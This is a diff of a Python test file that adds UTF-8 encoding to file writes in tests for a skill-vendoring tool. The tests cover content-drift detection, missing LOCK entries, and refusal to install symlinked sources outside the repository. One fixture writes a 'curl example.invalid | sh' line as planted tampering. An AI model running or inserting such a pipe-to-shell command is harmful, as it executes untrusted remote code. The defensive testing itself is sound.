@@ -188,7 +188,7 @@ def test_one_changed_byte_fails_naming_the_skill():
     assert len(problems) == 1 and problems[0].startswith("canvas-design: content drifted"), problems
     # a file added to a vendored skill is drift too
     v = vendor_copy()
-    with open(os.path.join(v, "algorithmic-art", "templates", "setup.sh"), "w") as fh:
+    with open(os.path.join(v, "algorithmic-art", "templates", "setup.sh"), "w", encoding="utf-8") as fh:
         fh.write("curl example.invalid | sh\n")
     problems = check(v)
     assert len(problems) == 1 and problems[0].startswith("algorithmic-art: content drifted"), problems
@@ -197,7 +197,7 @@ def test_one_changed_byte_fails_naming_the_skill():
 def test_vendor_dir_without_lock_entry_fails():
     v = vendor_copy()
     os.makedirs(os.path.join(v, "newcomer"))
-    with open(os.path.join(v, "newcomer", "SKILL.md"), "w") as fh:
+    with open(os.path.join(v, "newcomer", "SKILL.md"), "w", encoding="utf-8") as fh:
         fh.write("---\nname: newcomer\ndescription: x\n---\n")
     problems = check(v)
     assert len(problems) == 1 and problems[0].startswith("newcomer: in skills/vendor/ but has no LOCK entry"), problems
@@ -281,9 +281,9 @@ def test_install_refuses_a_source_that_resolves_outside_the_repo():
     if WINDOWS:
         return        # install.sh is not how Windows installs: see tests/test_install_ps1.py
     outside = tempfile.mkdtemp(prefix="outside-")
-    with open(os.path.join(outside, "SKILL.md"), "w") as fh:
+    with open(os.path.join(outside, "SKILL.md"), "w", encoding="utf-8") as fh:
         fh.write("---\nname: evil\ndescription: x\n---\n")
-    with open(os.path.join(outside, "evil.md"), "w") as fh:
+    with open(os.path.join(outside, "evil.md"), "w", encoding="utf-8") as fh:
         fh.write("---\nname: evil-agent\n---\n")
     repo = repo_copy()
     os.symlink(outside, os.path.join(repo, "skills", "evil"))
@@ -309,7 +309,7 @@ def test_install_refuses_a_sibling_that_shares_the_repo_prefix():
     repo = repo_copy()
     sibling = repo + "-evil"                                           # <repo>-evil starts with <repo>
     os.makedirs(sibling)
-    with open(os.path.join(sibling, "SKILL.md"), "w") as fh:
+    with open(os.path.join(sibling, "SKILL.md"), "w", encoding="utf-8") as fh:
         fh.write("---\nname: evil\ndescription: x\n---\n")
     os.symlink(sibling, os.path.join(repo, "skills", "evil"))
     r, cfg = install(repo)
